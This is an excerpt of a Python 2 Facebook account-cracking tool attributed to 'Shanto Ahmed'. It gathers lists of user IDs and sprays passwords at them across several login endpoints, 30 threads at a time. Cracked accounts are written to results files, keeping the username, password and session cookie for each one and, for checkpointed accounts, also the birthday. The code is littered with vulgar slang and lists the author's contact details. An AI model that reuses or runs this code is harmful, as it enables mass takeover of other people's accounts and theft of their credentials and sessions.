#!/usr/bin/python2
# coding=utf-8
# code by Shanto Ahmed 
# my facebook ( https://www.facebook.com/shanto.ahmed09fackyou)
...
#  Moch Yayan Juan Alvredo Shanto.  #
#------------------------------->
...
def tod():
    ...
    for x in titik:
        print '\r %s[%s+%s] delete token %s'%(N,M,N,x),
        sys.stdout.flush()
        time.sleep(1)
...
lo_ngetod = 'https://www.facebook.com/shanto.ahmed09fackyou'
# crack complete
def result(ok,cp):
...
def moch_yayan():
    ...
    print ' (\033[0;92m•\033[0m) ACTIVE USER : %s'%(nama);time.sleep(0.03)
    ...
    print ' [%s8%s]. Check fb account information'%(O,N);time.sleep(0.03)
    print ' [%s9%s]. Ingfo user agent settings%sscript%s'%(O,N,O,N);time.sleep(0.03)
    print ' [%s0%s]. logout (%remove token%s)'%(M,N,M,N);time.sleep(0.03)
    pepek = raw_input('\n [*] menu : ')
    if pepek == '':
        ...
        print '\n'
        tod()
        time.sleep(1);os.system('rm -rf .File name.txt')
...
def publik(kontol):
    ...
    try:
        ...
        ys.close()
        jalan('\n\n %s[%s✓%s] Id dump failed, maybe the id is not public'%(N,H,N))
...
def cek_ingfo(kontol):
    try:
        user = raw_input("\n [%s+%s] Input id atau username : "%(O,N))
        if user == '':
    ...
    print ' [*] %s bulan %s tahun %s jam %s'%(day, month, year, jam);time.sleep(0.03)
    print ' %s[%s#%s]last updated on'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m'
    jalan('\n [%s✓%s] managed to check facebook account data\n\n'%(O,N));exit()

# cek ingfo sc
def info_tools():
    os.system('clear')
    print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;92m-\x1b[0m';time.sleep(0.07)
    print '\n %s[%s>%s] Name    : Shanto Ahmed.'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Author   : Shanto Ahmed.'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Github   : https://github.com/shantoerror'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Facebook : https://www.facebook.com/shanto.ahmed09fackyou'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Fb group   : Rongbaaz bd cyber security Tm'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Instagram: https://www.instagram.com/shanto_'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] wshatsapp : 01875755***'%(N,H,N);time.sleep(0.07)
...
def yo_ndak_tau_ko_tanya_saia():
    ...
    print ' (%s×%s) type User Agent or User Agent....\n'%(M,N)
    anjng = raw_input(' [%s?%s] Input User Agent :%s '%(O,N,H))
    if anjng == '':
        print '\n %s[%s×%s] Can't be empty Kentod'%(N,M,N);yo_ndak_tau_ko_tanya_saia()
    try:
...
def check_yntkts():
    try:
        user_agent = open('SHANTO.txt', 'r').read()
    except IOError:
    	user_agent = '%s-'%(M)
    except: pass
...
class __crack__:
    ...
    def plerr(self):
        try:
            ...
            print '\n %s[%s×%s] File [%s%s%s] no, dump id first bro, check number 1 until 4'%(N,M,N,M,self.apk,N);time.sleep(3)
            raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
        ...
        if ___yayanganteng___ in ('Y', 'y'):
            ...
            while True:
                ...
                if pwek == '':
                    print '\n %s[%s×%s] don't empty the password bro'%(N,M,N)
                elif len(pwek)<=5:
                    print '\n %s[%s×%s] password minimum 6 characters'%(N,M,N)
                else:
                    def __yan__(ysc=None): # ycs => Yayan dear Cindy:3
                        cin = raw_input('\n [*] method : ')
                        if cin == '':
                            print '\n %s[%s×%s] don't be empty bro'%(N,M,N);self.__yan__()
                        elif cin == '1':
                            ...
                            with YayanGanteng(max_workers=30) as (__Shanto__):
                                for ikeh in self.id:
                                    try:
    ...
    def __api__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            try:
            	_kontol = open('SHANTo.txt', 'r').read()
            except (KeyError, IOError):
            ...
            if 'access_token' in response.text and 'EAAA' in response.text:
                ...
                print '\r  %sShanto CP %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
    ...
    def __mbasic__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            if "c_user" in ses.cookies.get_dict().keys():
                ...
                try:
                    kontol = open('.shanto.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %sShanto CP %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                ...
                print '\r  %s*Shanto CP %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
    ...
    def __mfb__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %sShanto OK%s|%s|%s                 %s' % (H,user,pw,kuki,N)
                wrt = ' [✓] %s|%s|%s' % (user,pw,kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
    ...
    def __pler__(self):
        yan = raw_input('\n [*] method : ')
        if yan == '':
            print '\n %s[%s×%s] don't be empty bro'%(N,M,N);self.__pler__()
        elif yan in ('1', '01'):
            print '\n [%s+%s] OK result saved to-> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] CP result saved to-> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] you can turn off cellular data to pause the crack process\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__Shanto__):
            	for yntkts in self.id: # Yo Don't Know Why Ask Saia
                    try:
